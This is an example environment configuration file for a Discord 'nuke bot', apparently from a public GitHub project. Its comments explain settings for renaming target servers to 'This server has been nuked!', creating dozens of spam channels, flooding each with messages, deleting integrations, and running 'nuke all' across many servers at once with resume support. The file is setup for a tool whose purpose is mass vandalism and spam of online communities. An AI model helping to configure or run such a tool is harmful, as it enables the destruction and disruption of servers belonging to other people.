# ==================== BOT & AUTH ====================
# Discord bot token (required). Never commit your real .env file to git.
DISCORD_TOKEN=your_discord_bot_token_here

# Discord user ID of the bot owner; only this user can run commands and receives DM status updates.
OWNER_ID=12345678912345679

# ==================== SERVER & CHANNEL SETTINGS ====================
# Name of the parent category created to group all newly generated text channels.
CATEGORY_NAME=Nuked Server

# Prefix used when creating new text channels (e.g., "nuked-1", "nuked-2", ...).
CHANNEL_BASE_NAME=nuked

# Number of text channels to create under the category per server (Discord caps total channels at 500).
CHANNEL_COUNT=50

# Default number of messages sent per newly created channel (1-500).
MESSAGES_PER_CHANNEL=100

# Message text sent into each newly created channel.
MESSAGE_TEXT=This server has been nuked using Berkayprof's nuke bot! https://github.com/berkayprof/nukebot

# Replacement name applied to each target server (truncated to 100 characters by Discord).
NEW_SERVER_NAME=This server has been nuked!

# ==================== BEHAVIOR & SAFETY ====================
# Comma-separated list of server (guild) IDs to skip during bulk actions ("nuke all" and resume).
SKIP_GUILDS=

# When true, skips deleting integrations belonging to other Discord bots (own integration is always skipped).
SKIP_OTHER_BOT_INTEGRATIONS=true

# When true, the bot leaves a server shortly after finishing its run on that server.
AUTO_LEAVE=false

# ==================== PERFORMANCE, STATE & CONFIRMATION ====================
# Maximum number of servers processed at the same time during a multi-server run.
GUILD_CONCURRENCY=2

# Time-to-live (in milliseconds) for a "nuke all" confirmation prompt before it expires (300000 = 5 minutes).
CONFIRM_TTL_MS=300000

# Path to the JSON file used to save run progress for resuming or clearing (relative to script directory).
STATE_FILE=nuke-state.json
